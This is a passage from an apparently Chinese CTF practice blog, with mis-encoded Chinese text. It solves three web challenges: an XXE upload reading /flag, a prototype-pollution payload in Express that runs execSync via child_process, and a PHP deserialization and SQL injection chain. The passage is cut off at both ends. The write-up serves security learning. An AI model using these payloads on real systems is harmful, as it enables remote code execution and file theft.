class="language-none">((%9e%9a%9e%9b%9e%96%9e%9a)^(%9c%9a%9e%9b%9c%96%96%9a)^(%8f%9a%9e%9b%9b%96%9b%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%9c%9b)^(%9a%9b%9b)^(%9a%96%9b)^(%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175809750.png" alt="image-20220413175809750"></p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>æ–‡ä»¶ä¸Šä¼ çš„é¢˜ï¼Œä¸è¿‡ä¸æ˜¯ä¼ ä¸€å¥è¯ï¼Œè€Œæ˜¯ä¼ xmlæ–‡ä»¶ï¼Œåˆ©ç”¨xxeæ¥è¯»flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211118004.png" alt="image-20220417211118004"></p><p>é€šè¿‡æç¤ºçŸ¥é“flagåœ¨/flagé‡Œï¼Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211146823.png" alt="image-20220417211146823"></p><p>å†é…åˆè¿™ä¸ªä¸Šä¼ ç¤ºä¾‹ï¼Œå¯ä»¥å†™ä¸€ä¸ªxmlçš„æ–‡ä»¶</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;users&gt;    &lt;user&gt;        &lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;        &lt;password&gt;&amp;xxe;&lt;&#x2F;password&gt;        &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;        &lt;email&gt;&amp;xxe;&lt;&#x2F;email&gt;          &lt;group&gt;&amp;xxe;&lt;&#x2F;group&gt;        &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt;    &lt;&#x2F;user&gt;&lt;&#x2F;users&gt;</code></pre><p>ä½†æ˜¯è¿™é‡Œçš„è¿‡æ»¤ä¸çŸ¥é“æ˜¯é€šè¿‡ä»€ä¹ˆæ–¹å¼çš„ï¼Œé€šè¿‡utf-16ç¼–ç å°±å¯ä»¥ç»•è¿‡ï¼Œutf-8å°±ä¸è¡Œï¼Œæ‰€ä»¥windowså¯ä»¥ç”¨è®°äº‹æœ¬å†™å®Œä¹‹åå¦å­˜ä¸ºutf-16çš„æ ¼å¼ï¼ŒLinuxå°±æ˜¯åˆ©ç”¨<code>iconv -f utf8 -t utf-16 2.xml&gt;1.xml</code>çš„å‘½ä»¤æŠŠutf-8è½¬åŒ–ä¸ºutf-16</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211659665.png" alt="image-20220417211659665"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211720623.png" alt="image-20220417211720623"></p><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>åŸå‹é“¾æ±¡æŸ“å’Œjsçš„å¤§å°å†™ç‰¹æ€§</p><p>å­˜åœ¨æºç æ³„éœ²ï¼Œ<a href="http://www.zipä¸‹è½½æºç ,ä¸»è¦æ˜¯çœ‹è·¯ç”±çš„éƒ¨åˆ†/">www.zipä¸‹è½½æºç ï¼Œä¸»è¦æ˜¯çœ‹è·¯ç”±çš„éƒ¨åˆ†</a></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">isObject</span> <span class="token operator">=</span> <span class="token parameter">obj</span> <span class="token operator">=></span> obj <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Object<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> a<span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span><span class="token parameter">keyword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(admin)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">is</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> keyword  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token keyword">undefined</span><span class="token punctuation">&#125;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span>outputFunctionName<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">&#123;</span>      <span class="token string">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'passwd'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>      <span class="token string">'isLogin'</span><span class="token operator">:</span><span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>   req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('success');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token operator">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>æˆ‘ä»¬çœ‹åˆ°ç™»å½•çš„éƒ¨åˆ†æœ‰toUpperCaseï¼Œè€Œé¢˜ç›®è¦æ±‚è¦ç”¨ADMINç”¨æˆ·ç™»å½•ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨jsçš„å¤§å°å†™ç‰¹æ€§ç»•è¿‡</p><pre class="language-none"><code class="language-none">toUpperCase()å…¶ä¸­æ··å…¥äº†ä¸¤ä¸ªå¥‡ç‰¹çš„å­—ç¬¦&quot;Ä±&quot;ã€&quot;Å¿&quot;ã€‚ è¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´&quot;Ä±&quot;.toUpperCase() &#x3D;&#x3D; &#39;I&#39;ï¼Œ&quot;Å¿&quot;.toUpperCase() &#x3D;&#x3D; &#39;S&#39;ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚toLowerCase()è¿™ä¸ª&quot;â„ª&quot;çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯&quot;â„ª&quot;.toLowerCase() &#x3D;&#x3D; &#39;k&#39;.</code></pre><p>åˆ©ç”¨admÄ±næ³¨å†Œå°±å¯ä»¥</p><p>ç™»å½•åæç¤ºflagåœ¨/flagé‡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221749857.png" alt="image-20220418221749857"></p><p>è€Œæºç ä¸­å­˜åœ¨ç€mergeå‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221823929.png" alt="image-20220418221823929"></p><p>è€Œinfoä¸­</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221932516.png" alt="image-20220418221932516"></p><p>outputFunctionæ­£å¥½åˆæ˜¯æœªå®šä¹‰ï¼Œinfoè¿˜ä¼šå°†outputFunctionNameæ¸²æŸ“åˆ°é¡µé¢ä¸­</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç»™å¯¹è±¡åŸå‹çš„ç±»æ·»åŠ ä¸€ä¸ªoutputFunctionNameå±æ€§ï¼Œé€šè¿‡å®ƒå¾—åˆ°flagã€‚</p><p>payloadï¼š</p><pre class="language-none"><code class="language-none">&#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;ä¸å¤ªç†è§£è¿™é‡Œæœ€åçš„&#x2F;&#x2F;çš„å«ä¹‰ï¼Œä½†æ˜¯æ²¡æœ‰è¿™ä¸ªä¸ä¼šæˆåŠŸæ‰§è¡Œï¼Œè€Œä¸”ä¼šå‡ºç°æŠ¥é”™ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºå¯èƒ½æ˜¯å¯¹åæ–‡çš„æ³¨é‡Šï¼Œè€Œä¸”ç”¨&#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);x&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;ä¹Ÿèƒ½æˆåŠŸï¼Œæ‰€ä»¥åº”è¯¥å°±æ˜¯ä¸ºäº†ä¿è¯è¯­å¥çš„å®Œæ•´</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418222438819.png" alt="image-20220418222438819"></p><p>è¿™æ—¶å€™å†è®¿é—®ä¸€ä¸‹/infoå°±èƒ½ä¸‹è½½åˆ°flagæ–‡ä»¶</p><h2 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><p>ç¡®å®ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ ï¼Œåªèƒ½ä¼ å›¾ç‰‡è€Œä¸”è·¯å¾„ä¹Ÿæ²¡æœ‰ï¼Œè¿™å…¶å®æ˜¯ä¸€ä¸ªæ­é…ååºåˆ—åŒ–çš„sqlé¢˜</p><p>show.php:</p><pre class="language-none"><code class="language-none">&lt;?phpinclude(&quot;.&#x2F;helper.php&quot;);$show &#x3D; new show();if($_GET[&quot;delete_all&quot;])&#123;   if($_GET[&quot;delete_all&quot;] &#x3D;&#x3D; &quot;true&quot;)&#123;      $show-&gt;Delete_All_Images();   &#125;&#125;$show-&gt;Get_All_Images();class show&#123;   public $con;   public function __construct()&#123;      $this-&gt;con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);      if (mysqli_connect_errno($this-&gt;con))&#123;              die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());      &#125;   &#125;   public function Get_All_Images()&#123;      $sql &#x3D; &quot;SELECT * FROM images&quot;;      $result &#x3D; mysqli_query($this-&gt;con, $sql);      if ($result-&gt;num_rows &gt; 0)&#123;          while($row &#x3D; $result-&gt;fetch_assoc())&#123;             if($row[&quot;attr&quot;])&#123;                $attr_temp &#x3D; str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);               $attr &#x3D; unserialize($attr_temp);            &#125;              echo &quot;&lt;p&gt;id&#x3D;&quot;.$row[&quot;id&quot;].&quot; filename&#x3D;&quot;.$row[&quot;filename&quot;].&quot; path&#x3D;&quot;.$row[&quot;path&quot;].&quot;&lt;&#x2F;p&gt;&quot;;          &#125;      &#125;else&#123;          echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;&#x2F;p&gt;&quot;;      &#125;      mysqli_close($this-&gt;con);   &#125;   public function Delete_All_Images()&#123;      $sql &#x3D; &quot;DELETE FROM images&quot;;      $result &#x3D; mysqli_query($this-&gt;con, $sql);   &#125;&#125;</code></pre><p>upload.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude(&quot;.&#x2F;helper.php&quot;);class upload extends helper &#123;   public function upload_base()&#123;      $this-&gt;upload();   &#125;&#125;if ($_FILES)&#123;   if ($_FILES[&quot;file&quot;][&quot;error&quot;])&#123;      die(&quot;Upload file failed.&quot;);   &#125;else&#123;      $file &#x3D; new upload();      $file-&gt;upload_base();   &#125;&#125;$a &#x3D; new helper();</code></pre><p>helper.php</p><pre class="language-none"><code class="language-none">&lt;?phpclass helper &#123;   protected $folder &#x3D; &quot;pic&#x2F;&quot;;   protected $ifview &#x3D; False;    protected $config &#x3D; &quot;config.txt&quot;;   &#x2F;&#x2F; The function is not yet perfect, it is not open yet.   public function upload($input&#x3D;&quot;file&quot;)   &#123;      $fileinfo &#x3D; $this-&gt;getfile($input);      $array &#x3D; array();      $array[&quot;title&quot;] &#x3D; $fileinfo[&#39;title&#39;];      $array[&quot;filename&quot;] &#x3D; $fileinfo[&#39;filename&#39;];      $array[&quot;ext&quot;] &#x3D; $fileinfo[&#39;ext&#39;];      $array[&quot;path&quot;] &#x3D; $fileinfo[&#39;path&#39;];      $img_ext &#x3D; getimagesize($_FILES[$input][&quot;tmp_name&quot;]);      $my_ext &#x3D; array(&quot;width&quot;&#x3D;&gt;$img_ext[0],&quot;height&quot;&#x3D;&gt;$img_ext[1]);      $array[&quot;attr&quot;] &#x3D; serialize($my_ext);      $id &#x3D; $this-&gt;save($array);      if ($id &#x3D;&#x3D; 0)&#123;         die(&quot;Something wrong!&quot;);      &#125;      echo &quot;&lt;br&gt;&quot;;      echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;&#x2F;p&gt;&quot;;   &#125;   public function getfile($input)   &#123;      if(isset($input))&#123;         $rs &#x3D; $this-&gt;check($_FILES[$input]);      &#125;      return $rs;   &#125;   public function check($info)   &#123;      $basename &#x3D; substr(md5(time().uniqid()),9,16);      $filename &#x3D; $info[&quot;name&quot;];      $ext &#x3D; substr(strrchr($filename, &#39;.&#39;), 1);      $cate_exts &#x3D; array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);      if(!in_array($ext,$cate_exts))&#123;         die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;&#x2F;p&gt;&quot;);      &#125;       $title &#x3D; str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename);       return array(&#39;title&#39;&#x3D;&gt;$title,&#39;filename&#39;&#x3D;&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;&#x3D;&gt;$ext,&#39;path&#39;&#x3D;&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);   &#125;   public function save($data)   &#123;      if(!$data || !is_array($data))&#123;         die(&quot;Something wrong!&quot;);      &#125;      $id &#x3D; $this-&gt;insert_array($data);      return $id;   &#125;   public function insert_array($data)   &#123;        $con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);      if (mysqli_connect_errno($con))       &#123;           die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());      &#125;      $sql_fields &#x3D; array();      $sql_val &#x3D; array();      foreach($data as $key&#x3D;&gt;$value)&#123;         $key_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $key);         $value_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value);         $sql_fields[] &#x3D; &quot;&#96;&quot;.$key_temp.&quot;&#96;&quot;;         $sql_val[] &#x3D; &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;;      &#125;      $sql &#x3D; &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;      mysqli_query($con, $sql);      $id &#x3D; mysqli_insert_id($con);      mysqli_close($con);      return $id;   &#125;   public function view_files($path)&#123;      if ($this-&gt;ifview &#x3D;&#x3D; False)&#123;         return False;         &#x2F;&#x2F;The function is not yet perfect, it is not open yet.      &#125;      $content &#x3D; file_get_contents($path);      echo $content;   &#125;   function __destruct()&#123;      # Read some config html      $this-&gt;view_files($this-&gt;config);   &#125;&#125;</code></pre><p>æˆ‘ä»¬èƒ½çœ‹åˆ°helperé‡Œæœ‰ä¸ªfile_get_contentsï¼Œè€Œä¸”pathçš„å€¼æ˜¯configçš„å†…å®¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419173441837.png" alt="image-20220419173441837"></p><p>åœ¨showé‡Œè¿˜æœ‰ä¸ªunserialize</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419173934449.png" alt="image-20220419173934449"></p><p>å¯ä»¥çœ‹å‡ºè¿™ä¸ªé¢˜æ˜¯ååºåˆ—åŒ–ï¼Œè€Œæˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ§åˆ¶configé‡Œçš„å†…å®¹</p><p>ååºåˆ—åŒ–çš„éƒ¨åˆ†å¾ˆç®€å•</p><pre class="language-none"><code class="language-none">&lt;?phpclass helper&#123;    protected $ifview &#x3D; true;    protected $config &#x3D; &quot;&#x2F;flag&quot;;&#125;$a &#x3D; new helper();echo serialize($a);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419174443448.png" alt="image-20220419174443448"></p><p>ä½†æ˜¯æˆ‘ä»¬è¦æƒ³åŠæ³•æŠŠè¿™ä¸ªä¼ è¿›å»</p><p>å†æ¥çœ‹æŠŠå›¾ç‰‡å­˜å…¥æ•°æ®åº“çš„è¿‡ç¨‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419182850792.png" alt="image-20220419182850792"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419182904814.png" alt="image-20220419182904814"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419183012084.png" alt="image-20220419183012084"></p><p>é‚£ä¹ˆæ­£å¸¸çš„è¯­å¥å°±åº”è¯¥æ˜¯</p><pre class="language-none"><code class="language-none">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;å›¾ç‰‡åç§°&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code></pre><p>è€Œtitleæˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ çš„payloadä¸º</p><pre class="language-none"><code 